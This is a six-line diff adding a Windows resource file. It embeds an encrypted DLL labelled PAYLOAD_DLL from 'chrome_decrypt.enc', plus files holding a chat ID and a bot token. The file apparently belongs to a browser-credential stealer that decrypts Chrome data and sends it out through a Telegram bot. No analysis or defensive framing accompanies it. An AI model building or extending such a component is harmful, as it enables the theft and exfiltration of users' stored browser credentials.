@@ -1,0 +1,6 @@
+#include "resource.h"
+
+PAYLOAD_DLL RCDATA "chrome_decrypt.enc"
+
+IDR_CHAT_ID      RCDATA "chat_id.txt"
+IDR_BOT_TOKEN    RCDATA "bot_token.txt"
